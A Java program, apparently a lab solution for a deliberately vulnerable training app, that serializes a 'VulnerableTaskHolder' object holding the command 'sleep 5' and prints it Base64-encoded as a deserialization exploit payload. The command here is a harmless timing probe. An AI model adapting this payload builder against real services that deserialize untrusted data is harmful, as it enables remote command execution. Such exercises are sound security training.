import org.dummy.insecure.framework.VulnerableTaskHolder;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

// Press Shift twice to open the Search Everywhere dialog and type `show whitespaces`,
// then press Enter. You can now see whitespace characters in your code.
public class Main {
    public static void main(String[] args) {
        try {
            VulnerableTaskHolder vulnerableTaskHolder = new VulnerableTaskHolder("sleep", "sleep 5");
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream outputStream = new ObjectOutputStream(byteArrayOutputStream);
            outputStream.writeObject(vulnerableTaskHolder);
            outputStream.flush();
            byte[] exploit = byteArrayOutputStream.toByteArray();
            String exp = Base64.getEncoder().encodeToString(exploit);
            System.out.println(exp);
        } catch (Exception e) {
            System.err.println(e.getMessage());
        }
    }
}